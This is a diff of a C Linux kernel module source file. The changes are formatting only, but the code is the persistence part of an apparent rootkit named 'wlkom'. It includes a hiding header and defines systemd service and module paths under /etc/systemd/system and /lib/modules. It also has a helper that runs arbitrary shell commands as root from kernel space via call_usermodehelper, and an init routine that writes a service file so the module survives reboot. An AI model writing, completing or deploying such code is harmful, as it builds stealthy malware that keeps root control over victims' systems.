@@ -1,10 +1,12 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/fs.h>
+#include "persist.h"
+
 #include <linux/fcntl.h>
+#include <linux/fs.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
-#include "persist.h"
+
 #include "hide.h"
 
 /*
@@ -19,8 +21,8 @@
  */
 
 #define WLKOM_SERVICE_PATH "/etc/systemd/system/wlkom.service"
-#define WLKOM_MODULE_DIR   "/lib/modules/wlkom"
-#define WLKOM_MODULE_PATH  "/lib/modules/wlkom/wlkom.ko"
+#define WLKOM_MODULE_DIR "/lib/modules/wlkom"
+#define WLKOM_MODULE_PATH "/lib/modules/wlkom/wlkom.ko"
 #define WLKOM_SERVICE_NAME "wlkom.service"
 
 static const char *service_content =
@@ -49,11 +51,9 @@ static int write_file(const char *path, const char *content, size_t len)
 static void run_cmd(const char *cmd)
 {
     char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
-    char *envp[] = {
-        "HOME=/",
-        "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin",
-        NULL
-    };
+    char *envp[] = { "HOME=/",
+                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin",
+                     NULL };
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
 
@@ -68,7 +68,8 @@ int persist_init(void)
     /* Write the service file */
     int ret = write_file(WLKOM_SERVICE_PATH, service_content,
                          strlen(service_content));
-    if (ret < 0) {
+    if (ret < 0)
+    {
         pr_err("WLKOM persist: cannot write service file (%d)\n", ret);
         return ret;
     }
